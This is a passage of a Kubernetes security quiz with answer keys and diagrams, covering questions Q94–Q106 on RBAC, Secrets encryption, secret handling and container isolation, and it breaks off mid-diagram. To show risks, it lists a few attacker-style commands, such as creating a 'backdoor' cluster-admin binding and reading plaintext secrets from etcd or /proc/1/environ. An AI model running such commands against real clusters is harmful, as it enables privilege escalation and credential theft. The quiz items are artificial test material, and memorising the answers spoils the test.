CRDs can ship with aggregation labels → users with "view" automatically get read access to new custom resources without manual permission updates
✅ Correct Answer: D

RBAC aggregation allows ClusterRoles to dynamically compose from other ClusterRoles using label selectors. The built-in roles (view, edit, admin) use aggregation. When you install a CRD (e.g., cert-manager), it can ship a ClusterRole with the label rbac.authorization.k8s.io/aggregate-to-view: "true" — this automatically grants read access to the new CRD resources to anyone with the view role. No manual RBAC updates needed. This is how the ecosystem works: new controllers and CRDs automatically integrate with the standard RBAC roles.

📝 Detailed Explanation
RBAC Aggregation — Auto-Compose Permissions
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  BUILT-IN "view" ClusterRole (uses aggregation):                 │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ aggregationRule:                                            │  │
  │  │   clusterRoleSelectors:                                     │  │
  │  │   - matchLabels:                                            │  │
  │  │       rbac.authorization.k8s.io/aggregate-to-view: "true"  │  │
  │  │ → Auto-includes ALL ClusterRoles with that label            │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                  │
  │  WHEN cert-manager IS INSTALLED:                                 │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ apiVersion: rbac.authorization.k8s.io/v1                   │  │
  │  │ kind: ClusterRole                                          │  │
  │  │ metadata:                                                  │  │
  │  │   name: cert-manager-view                                  │  │
  │  │   labels:                                                  │  │
  │  │     rbac.authorization.k8s.io/aggregate-to-view: "true"    │  │
  │  │ rules:                                                     │  │
  │  │ - apiGroups: ["cert-manager.io"]                          │  │
  │  │   resources: ["certificates", "issuers"]                  │  │
  │  │   verbs: ["get", "list", "watch"]                         │  │
  │  │                                                            │  │
  │  │ RESULT: Anyone with "view" automatically gets read access  │  │
  │  │ to cert-manager resources. No manual RBAC update needed!  │  │
  │  └────────────────────────────────────────────────────────────┘  │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The cluster uses several operators (cert-manager, External Secrets, Kyverno) that all ship with aggregation labels. When a developer is granted the view role (read-only across the cluster), they automatically get read access to certificates, issuers, externalsecrets, and policies — because those CRDs aggregate into view. No manual RBAC configuration needed for new operators. This is RBAC automation at work.

Security Fundamentals Q95 of 200
Why is the "cluster-admin" ClusterRole dangerous and who should have it?
A) Full control: all verbs (*) on all resources (*) in all namespaces. Can read ALL secrets (including other apps'), impersonate any user, create privileged pods anywhere, modify/delete any RBAC rule, and access the /etc/kubernetes/pki directory via hostPath mounts. Only 1-2 designated cluster administrators. Audit ALL uses. Never bind to default SA, never bind to CI/CD, never bind to application SAs
B) cluster-admin is the default for all new users — it's the starting point
C) cluster-admin only applies to the kube-system namespace — it's not that dangerous
D) Every developer should have cluster-admin in dev environments for productivity
✅ Correct Answer: A

cluster-admin is the "root" of Kubernetes RBAC. It grants * (all verbs) on * (all resources) in * (all API groups) — effectively unrestricted access to the entire cluster. A cluster-admin can: read every Secret in every namespace (including other applications' database passwords), impersonate any user (including other cluster-admins), create privileged pods that can escape to the host, modify or delete any RBAC rule (including removing their own restrictions), and access cluster certificates. This role should be held by as few people as possible — typically 1-2 designated cluster operators. Every use should be audited and justified.

📝 Detailed Explanation
cluster-admin — What It Unlocks (Everything)
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  cluster-admin ClusterRole:                                      │
  │  rules:                                                          │
  │  - apiGroups: ["*"]                                              │
  │    resources: ["*"]                                              │
  │    verbs: ["*"]                                                  │
  │                                                                  │
  │  TRANSLATION: "Do anything, anywhere, anytime."                  │
  │                                                                  │
  │  WHAT THIS MEANS IN PRACTICE:                                    │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ ✅ kubectl get secrets -A → Read ALL secrets everywhere   │  │
  │  │ ✅ kubectl create -f privileged-pod.yaml → Deploy anything│  │
  │  │ ✅ kubectl delete ns production → Destroy production      │  │
  │  │ ✅ kubectl create clusterrolebinding backdoor \            │  │
  │  │    --clusterrole=cluster-admin \                           │  │
  │  │    --user=attacker → Create new cluster-admins            │  │
  │  │ ✅ kubectl --as=any-user → Impersonate anyone             │  │
  │  │ ✅ Access etcd directly (if certs are accessible)         │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                  │
  │  WHO SHOULD HAVE IT: 1-2 designated cluster operators ONLY.      │
  │  WHO SHOULD NOT: Developers, CI/CD pipelines, application SAs,   │
  │                   monitoring tools, anyone else.                  │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Only two senior SREs have cluster-admin, and only via OIDC (no static kubeconfig with embedded certs). Every cluster-admin action is audited: audit logs flag all cluster-admin API calls and send them to the SIEM with PagerDuty alerts. No ServiceAccount — not even CI/CD — has cluster-admin. The CI/CD deployer has narrowly scoped permissions (update deployments in specific namespaces only). This limits the blast radius of any credential compromise.

Security Fundamentals Q96 of 200
How do you create a "namespace admin" — full access but only in one namespace?
A) Bind the cluster-admin ClusterRole via a RoleBinding — it automatically scopes to one namespace
B) Create a Role with * verbs on * resources, then RoleBinding it to the user/SA in the target namespace. kubectl create role team-admin --verb=* --resource=* -n team-anihpj && kubectl create rolebinding team-admin-binding --role=team-admin --user=team-lead -n team-anihpj. Since Role is namespace-scoped, * means "all resources IN THIS NAMESPACE" — not cluster-wide
C) Use the built-in "admin" ClusterRole with a RoleBinding — it automatically scopes down
D) Namespace admin isn't possible — you can only have cluster-wide administrators
✅ Correct Answer: B

A namespace admin has full control within a single namespace but zero access outside it. Create a Role (namespace-scoped) with * verbs on * resources. Bind it via RoleBinding to the target user/SA. The key insight: * in a Role means "all resources that are namespaced IN THIS NAMESPACE" — it does NOT grant access to cluster-scoped resources (nodes, PVs, namespaces) or resources in other namespaces. Common use case: each team gets their own namespace and a "namespace admin" who can manage deployments, configs, secrets, and RBAC within their namespace — but can't touch anything outside it.

📝 Detailed Explanation
Namespace Admin — Full Power, Limited Scope
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  CREATE NAMESPACE ADMIN:                                         │
  │  ───────────────────────                                         │
  │  kubectl create role ns-admin \                                  │
  │    --verb=* --resource=* -n team-anihpj                         │
  │                                                                  │
  │  kubectl create rolebinding ns-admin-binding \                   │
  │    --role=ns-admin --user=alice -n team-anihpj                  │
  │                                                                  │
  │  WHAT ALICE CAN DO (in team-anihpj namespace):                   │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ ✅ kubectl create/delete deployments, pods, services       │  │
  │  │ ✅ kubectl create/delete secrets, configmaps               │  │
  │  │ ✅ kubectl create rolebinding ... (manage RBAC in THIS ns) │  │
  │  │ ✅ kubectl get/logs/exec everything in THIS namespace      │  │
  │  │ ✅ Full control of team-anihpj namespace                    │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                  │
  │  WHAT ALICE CANNOT DO:                                           │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ ❌ kubectl get pods -n other-team → FORBIDDEN              │  │
  │  │ ❌ kubectl get nodes → FORBIDDEN (cluster-scoped)          │  │
  │  │ ❌ kubectl create namespace → FORBIDDEN (cluster-scoped)   │  │
  │  │ ❌ kubectl get secrets -A → FORBIDDEN (other namespaces)   │  │
  │  │ ❌ kubectl create clusterrolebinding → FORBIDDEN           │  │
  │  └────────────────────────────────────────────────────────────┘  │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Each team (web, api, data) has a namespace admin role bound to their team lead. The web team lead can fully manage the anihpj-web namespace but cannot access the anihpj-db namespace or cluster resources. This enables self-service (teams manage their own resources) while maintaining security isolation between teams. If the web team lead's credentials are compromised, the blast radius is limited to the web namespace.

3.5 SecretsQ97–Q102

Security Fundamentals Q97 of 200
Why is "base64" NOT encryption for Kubernetes Secrets?
A) Base64 is ENCODING, not encryption. echo "c2VjcmV0MTIz" | base64 -d → "secret123" instantly. By default, Secrets in etcd are stored as base64 — anyone with etcd access reads ALL secrets in plaintext with one decode command. Base64 provides ZERO security — it's just a transport encoding to safely handle binary data in YAML/JSON. Real encryption requires EncryptionConfiguration with AES-CBC, AES-GCM, or KMS
B) Base64 is secure enough — decoding requires a special key
C) Base64 is the same as AES-256 encryption — it's industry standard
D) Kubernetes automatically encrypts all base64 Secrets before storing in etcd
✅ Correct Answer: A

This is the most important distinction in Kubernetes Secrets: base64 is encoding, not encryption. Encoding means "represent the same data in a different format" — base64("secret123") = "c2VjcmV0MTIz". Anyone can reverse it with base64 -d. Encryption means "transform data so only someone with a key can read it" — encrypted data looks like random noise. By default, Kubernetes stores Secrets in etcd as base64-encoded values — they're NOT encrypted. Anyone with etcd access can read all Secrets in plaintext. To actually protect Secrets, you MUST enable EncryptionConfiguration (AES-CBC, AES-GCM, or envelope encryption with KMS).

📝 Detailed Explanation
Base64 Encoding vs Real Encryption
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  ENCODING (Base64):               ENCRYPTION (AES-256-GCM):      │
  │  ┌──────────────────────┐        ┌──────────────────────────┐   │
  │  │ Input: secret123     │        │ Input: secret123         │   │
  │  │        ↓ base64      │        │        ↓ AES-256-GCM +   │   │
  │  │ Output: c2VjcmV0MTIz │        │          encryption key  │   │
  │  │        ↓ base64 -d   │        │ Output: 4f8a2b1c9d3e...  │   │
  │  │ Input: secret123     │        │ (random-looking bytes)   │   │
  │  │                      │        │        ↓ decrypt + key   │   │
  │  │ REVERSIBLE BY ANYONE │        │ Input: secret123         │   │
  │  │ (no key needed!)     │        │                          │   │
  │  └──────────────────────┘        │ REVERSIBLE ONLY WITH KEY │   │
  │                                  └──────────────────────────┘   │
  │                                                                  │
  │  DEFAULT KUBERNETES BEHAVIOR:                                    │
  │  Secret in etcd → stored as base64 → NO encryption!              │
  │  $ etcdctl get /registry/secrets/anihpj/anihpj-db-password      │
  │  → base64-encoded value → base64 -d → PLAINTEXT PASSWORD 💥    │
  │                                                                  │
  │  WITH EncryptionConfiguration:                                   │
  │  Secret in etcd → encrypted with AES-GCM → ciphertext only      │
  │  $ etcdctl get /registry/secrets/anihpj/anihpj-db-password      │
  │  → encrypted blob → CANNOT decode without encryption key 🔒     │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: EncryptionConfiguration is enabled with AES-256-GCM + an external KMS plugin (AWS KMS). Every Secret written to etcd is encrypted BEFORE storage. Even if an attacker gains etcd access (e.g., through a compromised control plane node), they see only ciphertext — not the actual database passwords, API keys, or Django SECRET_KEY. The KMS key is rotated annually and its access is strictly audited via CloudTrail.

Security Fundamentals Q98 of 200
How does EncryptionConfiguration protect Secrets in etcd?
A) It encrypts network traffic between pods and the API server
B) It encrypts the entire etcd database — all resources, not just Secrets
C) Encrypts Secrets BEFORE writing to etcd using AES-CBC, AES-GCM, or envelope encryption via external KMS. On WRITE: API server encrypts the Secret value → etcd stores ciphertext. On READ: API server decrypts before returning to the client. Without it: etcd access = total Secret compromise. With it: etcd contains ciphertext that's useless without the encryption key
D) It encrypts Secrets only in transit — at rest they remain base64
✅ Correct Answer: C

EncryptionConfiguration is the API server's mechanism for encrypting resource data at rest in etcd. It intercepts Secret writes (and optionally other resources like ConfigMaps) and encrypts the data BEFORE it reaches etcd. On reads, the API server decrypts the data before returning it to the client. This means: the encryption is transparent to pods and users (they see plaintext), but anyone with direct etcd access sees only ciphertext. The encryption key itself can be stored locally (less secure) or managed by an external KMS (more secure — key never leaves the KMS).

📝 Detailed Explanation
EncryptionConfiguration — Transparent Encryption
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  WITHOUT EncryptionConfiguration:                                │
  │  ┌─────────┐     ┌──────────┐     ┌──────────┐                 │
  │  │ kubectl │────►│ API      │────►│ etcd     │                 │
  │  │ create  │     │ Server   │     │ (base64) │                 │
  │  │ secret  │     │ (no enc) │     │          │                 │
  │  └─────────┘     └──────────┘     └──────────┘                 │
  │                    etcd dump → plaintext Secrets 💥              │
  │                                                                  │
  │  WITH EncryptionConfiguration:                                   │
  │  ┌─────────┐     ┌──────────┐     ┌──────────┐                 │
  │  │ kubectl │────►│ API      │────►│ etcd     │                 │
  │  │ create  │     │ Server   │     │(ENCRYPTED)│                │
  │  │ secret  │     │ encrypts │     │          │                 │
  │  │         │     │ BEFORE   │     │          │                 │
  │  │         │     │ writing  │     │          │                 │
  │  └─────────┘     └──────────┘     └──────────┘                 │
  │        ↑                             │                          │
  │        │ plaintext                   │ ciphertext               │
  │        │                             │                          │
  │  kubectl get secret → API server     etcd dump → encrypted blob │
  │  decrypts BEFORE returning           (useless without key) 🔒   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: EncryptionConfiguration uses the aescbc provider with a local key for performance, AND the kms provider (AWS KMS) for envelope encryption. Two providers are configured for defense-in-depth — if the local key is somehow compromised, the KMS key provides an additional layer. The encryption key is rotated every 30 days by updating the EncryptionConfiguration and restarting the API server (kubeadm supports this through kubeadm init phase control-plane apiserver).

Security Fundamentals Q99 of 200
What are the main Kubernetes Secret types and when do you use each?
A) There is only one type: Opaque — all secrets use the same format
B) The types are: Small, Medium, and Large — based on data size
C) The types are: Public, Private, and Restricted — based on sensitivity level
D) ① Opaque (default): arbitrary key-value pairs (DB passwords, API keys, any custom data), ② kubernetes.io/tls: TLS certificate + private key for Ingress HTTPS (cert-manager auto-creates these), ③ kubernetes.io/dockerconfigjson: registry credentials for imagePullSecrets (authenticate to private registries), ④ kubernetes.io/service-account-token: legacy SA tokens (auto-managed, prefer bound tokens)
✅ Correct Answer: D

Kubernetes defines several Secret types, each with specific key requirements and use cases. Opaque is the default — arbitrary key-value pairs for any secret data. kubernetes.io/tls expects tls.crt and tls.key keys — used by Ingress for HTTPS termination (cert-manager creates these automatically). kubernetes.io/dockerconfigjson expects a .dockerconfigjson key — used for imagePullSecrets to authenticate to private registries. kubernetes.io/service-account-token is the legacy SA token type — auto-managed but being replaced by bound tokens.

📝 Detailed Explanation
Secret Types — Choose the Right One
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  TYPE                                │ REQUIRED KEYS │ USE CASE │
  │  ────────────────────────────────────┼───────────────┼──────────│
  │  Opaque (default)                    │ (any)         │ DB pwd,  │
  │                                      │               │ API keys │
  ├──────────────────────────────────────┼───────────────┼──────────┤
  │  kubernetes.io/tls                   │ tls.crt       │ Ingress  │
  │                                      │ tls.key        │ HTTPS    │
  ├──────────────────────────────────────┼───────────────┼──────────┤
  │  kubernetes.io/dockerconfigjson      │ .dockerconfig │ Private  │
  │                                      │ json           │ registry │
  ├──────────────────────────────────────┼───────────────┼──────────┤
  │  kubernetes.io/service-account-token │ token          │ Legacy   │
  │                                      │ ca.crt        │ SA token │
  │                                      │ namespace     │ (avoid)  │
  └──────────────────────────────────────┴───────────────┴──────────┘

For anihpj/jobpost: Opaque secrets store DB passwords, Redis passwords, and the Django SECRET_KEY. TLS secrets are managed by cert-manager (automatic creation + renewal for Ingress HTTPS). dockerconfigjson secrets authenticate the cluster to the private ECR registry. Legacy SA token secrets are NOT used — all pods use bound tokens.

Security Fundamentals Q100 of 200
Why is mounting Secrets as volumes MORE secure than using envFrom (environment variables)?
A) Environment variables are encrypted — they're actually more secure than volumes
B) Environment variables leak in multiple ways: visible in /proc/PID/environ (world-readable inside container), exposed in kubectl describe pod, dumped in crash logs, captured in debug endpoints. Volume mounts isolate secrets to a file path, support atomic updates (kubelet syncs changes), and are NOT exposed in process listings. Always prefer volumes over env vars for secrets
C) There's no difference — both are equally secure
D) envFrom is more secure because the values are only in memory
✅ Correct Answer: B

Environment variables are not designed for secrets. They're visible in /proc/<PID>/environ (readable by the same UID), displayed in kubectl describe pod (if not using SecretKeyRef), captured in crash dumps, and logged by many debugging tools. Volume-mounted secrets are isolated to a file path, stored in tmpfs (in-memory, never written to disk), support atomic updates (kubelet refreshes the mount when the Secret changes), and are NOT visible in process listings. The only downside: the app must read from a file instead of os.getenv() — a small code change for a large security improvement.

📝 Detailed Explanation
Secrets in Env Vars vs Volumes — Leak Vectors
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  ENV VARS (❌ leaks in many places):                             │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ env:                                                       │  │
  │  │ - name: DB_PASSWORD                                        │  │
  │  │   valueFrom:                                               │  │
  │  │     secretKeyRef:                                          │  │
  │  │       name: anihpj-db-creds                                │  │
  │  │       key: password                                        │  │
  │  │                                                            │  │
  │  │ LEAK VECTORS:                                              │  │
  │  │ 🔴 /proc/1/environ → DB_PASSWORD=secret123                │  │
  │  │ 🔴 kubectl exec -- env → DB_PASSWORD=secret123            │  │
  │  │ 🔴 Crash dumps include environment                         │  │
  │  │ 🔴 Child processes inherit env (fork + exec)               │  │
  │  │ 🔴 Debug endpoints (/debug/pprof, /actuator/env)           │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                  │
  │  VOLUME MOUNTS (✅ isolated, atomic):                            │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ volumes:                                                   │  │
  │  │ - name: secrets                                           │  │
  │  │   secret:                                                  │  │
  │  │     secretName: anihpj-db-creds                            │  │
  │  │                                                            │  │
  │  │ volumeMounts:                                              │  │
  │  │ - name: secrets                                            │  │
  │  │   mountPath: /etc/secrets                                  │  │
  │  │   readOnly: true                                           │  │
  │  │                                                            │  │
  │  │ BENEFITS:                                                  │  │
  │  │ ✅ /etc/secrets/password → only readable by app            │  │
  │  │ ✅ NOT in /proc/PID/environ                                │  │
  │  │ ✅ NOT in kubectl describe pod                             │  │
  │  │ ✅ tmpfs (in-memory, not on disk)                          │  │
  │  │ ✅ Atomic updates (kubelet syncs changes)                  │  │
  │  │ ✅ POSIX file permissions (chmod 0400)                     │  │
  │  └────────────────────────────────────────────────────────────┘  │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: ALL secrets are mounted as volumes, never as environment variables. The Django app reads /etc/secrets/db-password, /etc/secrets/secret-key, and /etc/secrets/redis-password from files. A file watcher (inotify) detects when secrets are rotated and Django reconnects with new credentials without restarting. The production team audits: "Is any pod using envFrom with Secrets?" — if found, it's flagged as a security issue and fixed.

Security Fundamentals Q101 of 200
In anihpj/jobpost, what secrets exist and how should they be managed securely?
A) Store all secrets in a ConfigMap — it's the Kubernetes-native way
B) Django SECRET_KEY, PostgreSQL password, Redis password, JWT signing key — store in AWS Secrets Manager or HashiCorp Vault via External Secrets Operator, rotate DB passwords every 90 days, use IRSA instead of static AWS credentials
C) One shared Secret YAML in the k8s/ directory committed to Git for version control
D) Hardcode them as environment variables in the Django settings.py for easy access
✅ Correct Answer: B

anihpj/jobpost has four critical secrets: Django SECRET_KEY (session signing, CSRF tokens, password reset tokens), PostgreSQL password, Redis password, and JWT signing key. NONE of these should be in Git, Dockerfile, or YAML manifests. Best practice: store in a dedicated secrets manager (AWS Secrets Manager, HashiCorp Vault) and sync into Kubernetes via External Secrets Operator. Rotate database passwords every 90 days. Use IRSA (IAM Roles for Service Accounts) instead of static AWS credentials stored in Secrets.

📝 Detailed Explanation
Secret Management — The Right Way vs The Wrong Way
  ❌ WRONG:                          ✅ RIGHT:
  ┌─────────────────────┐           ┌──────────────────────────┐
  │ secrets.yaml in Git │           │ AWS Secrets Manager       │
  │ SECRET_KEY: c2VjcmV0│           │ ├─ anihpj/django-key      │
  │ DB_PASS: cGFzc3dvcmQ│           │ ├─ anihpj/db-password     │
  │ (base64 = plaintext!)│           │ ├─ anihpj/redis-password  │
  │ Committed to repo ✗  │           │ └─ anihpj/jwt-secret     │
  └─────────────────────┘           └──────────┬───────────────┘
                                              │ External Secrets
  ❌ ALSO WRONG:                    ┌──────────▼───────────────┐
  ┌─────────────────────┐           │ External Secrets Operator │
  │ Hardcoded in code:   │           │ syncs → K8s Secret objects│
  │ SECRET_KEY = "abc"   │           │ (encrypted in etcd!)     │
  │ In settings.py ✗     │           └──────────┬───────────────┘
  └─────────────────────┘                      │
                                      ┌──────────▼───────────────┐
                                      │ Pod mounts Secret volume  │
                                      │ /etc/secrets/django-key   │
                                      │ (in-memory tmpfs, not disk)│
                                      └──────────────────────────┘

For anihpj/jobpost: The Django SECRET_KEY is the most dangerous secret — if leaked, attackers can forge session cookies (impersonate any user), sign malicious CSRF tokens, and generate valid password reset links. It's stored in AWS Secrets Manager with automatic rotation every 30 days. PostgreSQL and Redis passwords rotate quarterly. All pod access is via projected volume mounts (not env vars — those leak in /proc/PID/environ and kubectl describe).

Security Fundamentals Q102 of 200
How do you rotate a Kubernetes Secret without downtime?
A) Create NEW Secret (db-password-v2) → update Deployment to reference new Secret → rolling update redeploys pods with new Secret → verify healthy → delete old Secret. OR: use volume mount → K8s auto-updates the mounted file (takes ~90s) — app must watch for file changes via inotify or signal handler
B) Edit the existing Secret in-place with kubectl edit secret — Kubernetes automatically restarts all pods
C) Delete the old Secret, create a new one with the same name — Kubernetes handles the transition automatically
D) Secrets cannot be rotated — you must recreate the entire cluster
✅ Correct Answer: A

Secret rotation without downtime follows a create-before-delete pattern. Create the NEW secret first (e.g., db-password-v2), then update the Deployment to reference it. A rolling update gradually replaces old pods (using old secret) with new pods (using new secret) — zero downtime. If mounting secrets as a volume (not env vars), the kubelet automatically syncs updates to the mounted file within ~90 seconds — the app just needs to watch for file changes. Never edit secrets in-place — pods don't auto-restart; you'll have a mix of old and new credentials.

📝 Detailed Explanation
Secret Rotation — Zero-Downtime Flow
  STEP 1: Create v2              STEP 2: Update Deployment
  ┌──────────────────┐          ┌──────────────────────────┐
  │ db-password       │          │ Deployment: anihpj-api    │
  │ db-password-v2 ✓  │          │ secretName: db-password   │
  │ (both exist now)  │          │ → db-password-v2          │
  └──────────────────┘          └──────────┬───────────────┘
                                           │ Rolling Update:
  STEP 3: Gradual rollout                  ▼
  ┌──────────────────────────────────────────────────────────┐
  │ Pod-v1 (old secret)  →  Pod-v2 (new secret)  →  ...     │
  │     Running               Starting                       │
  │     ↓ drains              ↓ ready                        │
  │     Terminated            Serving traffic ✓              │
  │                                                          │
  │ Result: NO downtime — always at least one pod serving    │
  └──────────────────────────────────────────────────────────┘

  STEP 4: Verify         STEP 5: Cleanup
  kubectl logs ...       kubectl delete secret db-password
  → "Connected to DB ✓"  (old secret removed)

For anihpj/jobpost: Database password rotation uses the volume mount method — the Django app watches /etc/secrets/db-password for changes via a file watcher. When the External Secrets Operator syncs a new password from AWS Secrets Manager, the kubelet updates the mounted file within 90 seconds, and Django reconnects to PostgreSQL with the new credentials without restarting.

3.6 Isolation & SegmentationQ103–Q107

Security Fundamentals Q103 of 200
What are the isolation boundaries in Kubernetes, from weakest to strongest?
A) There is only one isolation boundary — the container
B) Containers in the same pod → containers across pods → namespaces → nodes → clusters — pods provide no isolation between their containers
C) Kubernetes provides no isolation — all processes share the same kernel
D) ① Containers in same pod (share network/IPC — weakest) → ② Pods in same namespace (separate network via CNI) → ③ Namespace isolation (RBAC + NetworkPolicy + ResourceQuota) → ④ Node isolation (taints/tolerations) → ⑤ Hardware VM (Kata/Firecracker — strongest)
✅ Correct Answer: D

Kubernetes provides a layered isolation model with increasing strength. Containers in the same pod share the network namespace (same IP, localhost) — they're NOT isolated from each other. Pods are isolated by CNI-assigned unique IPs. Namespaces add RBAC, NetworkPolicy, and ResourceQuota layers. Nodes provide physical separation — taints/tolerations dedicate nodes. The strongest: hardware VM-level isolation (Kata Containers/Firecracker) where each pod gets its OWN kernel in a lightweight VM — even kernel exploits can't escape to the host.

📝 Detailed Explanation
Kubernetes Isolation — From Weakest to Strongest
  WEAKEST ───────────────────────────────────────────────────► STRONGEST

  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
  │Container │   │   Pod    │   │Namespace │   │   Node   │   │  Kata VM │
  │(same pod)│   │(CNI IP)  │   │(RBAC+NP) │   │(Taints)  │   │(own OS)  │
  ├──────────┤   ├──────────┤   ├──────────┤   ├──────────┤   ├──────────┤
  │Share:    │   │Separate: │   │Separate: │   │Separate: │   │Separate: │
  │•Network  │   │•IP addr  │   │•RBAC     │   │•Hardware │   │•KERNEL!  │
  │•IPC      │   │•Volumes  │   │•NP rules │   │•CPU/Mem  │   │•Drivers  │
  │•localhost│   │•PID ns   │   │•Quotas   │   │•Disks    │   │•Modules  │
  │          │   │•cgroups  │   │•Limits   │   │•NICs     │   │•All of it│
  └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
  Sidecar/      default       namespaced     dedicated      untrusted
  adapter       isolation     isolation      nodes          workloads

For anihpj/jobpost: Web and API run as separate pods in the same namespace — they share RBAC scope but have separate NetworkPolicy rules. The PostgreSQL StatefulSet runs on dedicated nodes via taints (no other workloads). For CI/CD jobs that build untrusted code, we use gVisor runtime (sandboxed kernel) to prevent host compromise from malicious builds.

Security Fundamentals Q104 of 200
What is the difference between PodSecurityContext and Container SecurityContext?
A) They are the same thing — SecurityContext is always applied at the container level
B) PodSecurityContext applies to ALL containers in the pod (runAsUser, fsGroup) and serves as defaults; Container SecurityContext overrides per-container settings (capabilities, readOnlyRootFilesystem, allowPrivilegeEscalation) for container-specific exceptions
C) PodSecurityContext is for Linux; Container SecurityContext is for Windows
D) SecurityContext only exists at the Pod level — containers inherit everything automatically
✅ Correct Answer: B

PodSecurityContext sets defaults for ALL containers: common runAsUser, runAsGroup, fsGroup (filesystem group ownership). Container SecurityContext overrides individual containers: specific capabilities (NET_BIND_SERVICE for web, none for sidecar), readOnlyRootFilesystem (true for app, false for init container that writes config), allowPrivilegeEscalation. Think Pod-level = "all containers in this pod run as UID 1000", Container-level = "but the proxy sidecar also needs NET_BIND_SERVICE."

📝 Detailed Explanation
PodSecurityContext vs Container SecurityContext
  apiVersion: v1
  kind: Pod
  spec:
    securityContext:              ← POD LEVEL (defaults for ALL containers)
      runAsUser: 1000
      runAsGroup: 3000
      fsGroup: 2000              ← volume ownership for shared volumes

    containers:
    - name: app
      securityContext:            ← CONTAINER LEVEL (overrides/extensions)
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: [ALL]
          add: [NET_BIND_SERVICE] ← only THIS container gets this cap

    - name: sidecar
      securityContext:            ← different settings per container
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: [ALL]             ← sidecar gets NO capabilities
          # no NET_BIND_SERVICE

For anihpj/jobpost: The gunicorn container runs with drop ALL + NET_BIND_SERVICE (needs port 8000). The Cloud SQL Proxy sidecar also runs with drop ALL but no NET_BIND_SERVICE — it only makes outbound connections. Pod-level sets runAsUser: 1000 for both.

Security Fundamentals Q105 of 200
Why is runAsNonRoot: true important for container isolation?
A) It has no effect — containers always run as a regular user
B) It makes containers run faster by avoiding root privilege checks
C) Most images default to USER root (UID 0). If a container escapes to the host as root, it has ROOT on the node. runAsNonRoot: true forces a non-zero UID — if the image only supports root, the container FAILS TO START (fail closed). Combined with distroless base images, even code execution in the container yields no root access
D) It's a cosmetic setting — attackers can easily bypass it
✅ Correct Answer: C

runAsNonRoot: true is a fail-closed security control. If your image is configured to run as root (most are by default), the container will NOT start — you get an error instead of a running root container. This forces you to either use a non-root base image (distroless nonroot variants) or add USER directive in the Dockerfile. Combined with readOnlyRootFilesystem and drop ALL capabilities, even if an attacker gets code execution in your container, they cannot perform privileged operations.

📝 Detailed Explanation
runAsNonRoot — Fail Closed vs Fail Open
  ❌ WITHOUT runAsNonRoot:                ✅ WITH runAsNonRoot: true:
  ┌──────────────────────────┐           ┌──────────────────────────────┐
  │ Image: python:3.12       │           │ Image: python:3.12           │
  │ Default USER: root (0)   │           │ runAsNonRoot: true           │
  │                          │           │                              │
  │ Container starts as ROOT │           │ Container: CreateContainer   │
  │ ✓ Running (dangerous!)   │           │ Error: container has runAsNon│
  │                          │           │ Root but image runs as root  │
  │ Attacker RCE → root on   │           │ ✗ FAILED TO START            │
  │ node!                    │           │ (fail closed — SAFE!)        │
  └──────────────────────────┘           └──────────────────────────────┘

  FIX: Use distroless nonroot base:
  FROM gcr.io/distroless/python3-debian12:nonroot
  USER 1000:1000
  → Container runs as UID 1000 ✓
  → runAsNonRoot validation passes ✓

For anihpj/jobpost: All containers use the distroless nonroot variant (gcr.io/distroless/python3-debian12:nonroot). The USER is already 1000:1000 in the base image. runAsNonRoot: true is set at the Pod level — if anyone accidentally changes the base image to a root-default variant, the pod FAILS TO DEPLOY rather than running with root.

Security Fundamentals Q106 of 200
What does capabilities.drop: [ALL] do and why should you use it?
A) Drops ALL ~40 Linux capabilities. The container process has NO special kernel privileges — even as UID 0, it can't bind to ports <1024 or change file ownership. Add back ONLY what you need (NET_BIND_SERVICE for web servers). Start from zero, grant minimally
B) Removes all capabilities permanently — you can never add any back
C) Only removes NET_ADMIN and SYS_ADMIN — the rest remain
D) It's the same as running with --privileged=false (the default)
✅ Correct Answer: A

Linux capabilities break root's absolute power into ~40 granular permissions. By default, containers get a limited set (~15 capabilities). drop: [ALL] removes ALL of them — zero special privileges. Then add: [NET_BIND_SERVICE] grants back ONLY what's needed. This is the principle of least privilege applied to kernel capabilities. CAP_SYS_ADMIN alone enables container escape; CAP_NET_RAW enables packet sniffing; CAP_SYS_PTRACE enables process injection. Drop everything, add back what you can justify.

📝 Detailed Explanation
Linux Capabilities — The Least Privilege Approach
  DEFAULT CONTAINER CAPS (~15):          DROP ALL + ADD SPECIFIC:
  ┌────────────────────────────┐        ┌────────────────────────────┐
  │ CAP_CHOWN                  │        │ (none by default)          │
  │ CAP_DAC_OVERRIDE           │        │                            │
  │ CAP_FSETID                 │        │ + CAP_NET_BIND_SERVICE     │
  │ CAP_FOWNER                 │        │   (port 8000 for gunicorn) │
  │ CAP_KILL                   │        │                            │
  │ CAP_SETGID                 │        │ THAT'S IT. Nothing else.   │
  │ CAP_SETUID                 │        │                            │
  │ CAP_SETPCAP                │        │ Can't:                     │
  │ CAP_NET_BIND_SERVICE       │        │ • Change file ownership    │
